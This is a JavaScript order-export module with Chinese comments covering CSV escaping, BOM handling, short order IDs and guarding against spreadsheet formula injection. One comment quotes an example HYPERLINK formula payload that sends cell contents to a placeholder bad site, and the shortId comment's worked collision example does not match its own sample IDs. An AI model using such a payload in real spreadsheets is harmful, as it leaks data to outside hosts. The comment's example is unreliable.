/**
 * CSV 生成 —— 订单导出用
 *
 * 为什么单独一个模块、而且是**纯逻辑**：
 *   导出的正确性主要靠两个容易出错的地方：
 *     1. **CSV 转义**（客户名里带逗号/引号/换行，不转义就把表格撑坏了）
 *     2. **公式注入**（客户名写成 `=1+1`，Excel 会当公式执行）
 *   这两件事和浏览器、网络都无关，所以抽出来，能在 Node 里直接测。
 *   「导出能用」不能靠"在手机上下载一次看着没问题"来确认。
 *
 * 为什么用 CSV 而不是 xlsx：
 *   · 手机能直接打开（销售大多在手机上）
 *   · Excel / WPS / Numbers 都能读
 *   · 不需要引第三方库（项目一直坚持零依赖）
 *
 * ⚠️ **必须带 UTF-8 BOM**，否则 Excel 打开中文全是乱码。
 *    这是实测过的经典坑：不带 BOM 的 UTF-8 CSV，Excel 会按本地编码猜，
 *    简体中文 Windows 上猜成 GBK，整张表就是乱码。
 */

/** Excel 认这个 BOM 才会当 UTF-8 读。 */
export const BOM = '\uFEFF';

/**
 * 转义一个单元格。
 *
 * 规则（RFC 4180）：
 *   · 含逗号、引号、换行 → 整个用双引号包起来
 *   · 内部的引号 → 写成两个引号
 */
function cell(v) {
  const s = v === null || v === undefined ? '' : String(v);

  /**
   * ⚠️ **公式注入防护。**
   *
   * Excel/WPS 会把以 `=` `+` `-` `@` 开头的单元格当公式执行。
   * 客户名或备注是用户随便填的，如果有人填了
   * `=HYPERLINK("http://坏站/"&A1,"点我")`，打开导出文件就会中招。
   * 销售把导出的表发给别人（会计、老板）时，风险跟着文件走。
   *
   * 处理办法：前面加一个单引号，Excel 会当纯文本。
   * 代价是单元格里会看到一个前导单引号（在编辑栏里），
   * 但**这是行业通行做法**，比让人中招强。
   */
  const needsQuote = /^[=+\-@\t\r]/.test(s);
  const guarded = needsQuote ? `'${s}` : s;

  if (/[",\n\r]/.test(guarded)) {
    return `"${guarded.replace(/"/g, '""')}"`;
  }
  return guarded;
}

/**
 * 把二维数组转成 CSV 文本。
 *
 * @param rows      第一行当表头
 * @param {boolean} withBom  默认带 BOM（给 Excel 用）
 */
export function toCsv(rows, { withBom = true } = {}) {
  const body = rows.map((r) => r.map(cell).join(',')).join('\r\n');
  // \r\n 是 RFC 4180 规定的行分隔符，Excel 对它的兼容性最好
  return (withBom ? BOM : '') + body + '\r\n';
}

/* ------------------------------------------------------------------ *
 * 订单 → 导出表格
 * ------------------------------------------------------------------ */

const dt = (iso) => {
  if (!iso) return '';
  const d = new Date(iso);
  const p = (n) => String(n).padStart(2, '0');
  return `${d.getFullYear()}-${p(d.getMonth() + 1)}-${p(d.getDate())} ${p(d.getHours())}:${p(d.getMinutes())}`;
};

/**
 * 订单号：给一个短一点的、能口头念的编号。
 *
 * ⚠️ **这个函数踩过坑，别改回去。**
 *
 * 第一版是"去掉 `order:` 前缀，再删掉所有非字母数字，取后 8 位"：
 *     order:real-1792071889721-0  →  删掉连字符后取后 8 位  →  20902980
 *     order:real-1792071889721-1  →  同上                    →  20902980
 * **两张不同的单得到同一个号。** 原因：区分它们的那个 `-0` / `-1`
 * 恰好被"删掉非字母数字"这一步清掉了，后 8 位只剩时间戳。
 *
 * 对账时两张单显示同一个订单号 —— 这是事故，不是小瑕疵。
 *
 * 现在的做法：去掉 `order:` 前缀后，**只把末尾那段数字保留下来**，
 * 原样留一个短横线做分隔。既短、又能念、还不会撞。
 */
export function shortId(id) {
  const s = String(id ?? '');
  if (!s) return '';
  // 去掉 order: 前缀（只有这一处该动）
  const body = s.replace(/^order:/, '');
  /**
   * 取最后 12 个字符。数字 ID 是"时间戳 + 序号"，12 个字符足以保留
   * 时间戳的低位与序号，同时不至于长得念不出来。
   * **不能过滤字符** —— 分隔符本身就是区分度的一部分。
   */
  return body.slice(-12).toUpperCase();
}

const STATUS = { active: '有效', deleted: '已删除' };

/**
 * **明细表**：一行一个产品。
 *
 * 为什么这是主表而不是"一行一张单"：
 *   用户真正要回答的问题是"这批货都卖了些啥、按什么价卖的"。
 *   一行一张单只能看到总额，看不到明细；而明细行可以用数据透视汇总回总额。
 *
 * 一张单没有明细行时（理论上不该有，但历史数据可能有），
 * 也输出一行，否则**这张单会在导出里凭空消失**——对账时最怕这个。
 *
 * @param orders  订单数组
 * @param opts.withDeleted  是否包含已删除的单（默认不含）
 */
export function ordersToItemsCsv(orders, { withDeleted = false } = {}) {
  const rows = [[
    '订单号', '开单时间', '客户', '电话', '产品', '数量',
    '目录单价', '成交单价', '小计', '订单目录价合计', '订单让利', '订单应收',
    '出单人', '备注', '状态',
  ]];

  for (const o of orders) {
    if (!withDeleted && o.status === 'deleted') continue;

    const owner = o.sales_display || o.sales_id || '';
    const common = [
      shortId(o.id), dt(o.created_at), o.customer_name ?? '', o.customer_phone ?? '',
    ];
    const tail = [
      o.list_total ?? 0, o.discount ?? 0, o.total ?? 0,
      owner, o.remark ?? '', STATUS[o.status] ?? o.status ?? '',
    ];

    const items = Array.isArray(o.items) ? o.items : [];
    if (!items.length) {
      // 没有明细也要留一行，否则这单在导出里就没了
      rows.push([...common, '（无明细）', '', '', '', '', ...tail]);
      continue;
    }
    for (const it of items) {
      const qty = Number(it.qty) || 0;
      const actual = Number(it.actual_price) || 0;
      rows.push([
        ...common,
        it.product_name ?? '',
        qty,
        Number(it.list_price) || 0,
        actual,
        qty * actual,
        ...tail,
      ]);
    }
  }
  return toCsv(rows);
}

/**
 * **汇总表**：一行一张单。
 *
 * 为什么还要这一份：
 *   明细表能汇总出来，但**得会用数据透视表**。
 *   老板月底就想要个"这个月多少张单、多少钱"，不该逼他处理几十行明细。
 *   多给一个文件，比教他做透视表省事得多。
 */
export function ordersToSummaryCsv(orders, { withDeleted = false } = {}) {
  const rows = [[
    '订单号', '开单时间', '最后改动', '客户', '电话', '件数', '品种数',
    '目录价合计', '让利', '应收', '出单人', '备注', '状态',
  ]];

  for (const o of orders) {
    if (!withDeleted && o.status === 'deleted') continue;
    const items = Array.isArray(o.items) ? o.items : [];
    rows.push([
      shortId(o.id),
      dt(o.created_at),
      dt(o.updated_at),
      o.customer_name ?? '',
      o.customer_phone ?? '',
      o.item_count ?? items.reduce((a, it) => a + (Number(it.qty) || 0), 0),
      items.length,
      o.list_total ?? 0,
      o.discount ?? 0,
      o.total ?? 0,
      o.sales_display || o.sales_id || '',
      o.remark ?? '',
      STATUS[o.status] ?? o.status ?? '',
    ]);
  }
  return toCsv(rows);
}

/** 给文件起名：带日期，避免下载多次后分不清哪个是新的。 */
export function exportFileName(kind, when = new Date()) {
  const p = (n) => String(n).padStart(2, '0');
  const stamp = `${when.getFullYear()}${p(when.getMonth() + 1)}${p(when.getDate())}`
    + `-${p(when.getHours())}${p(when.getMinutes())}`;
  return `木言-${kind}-${stamp}.csv`;
}
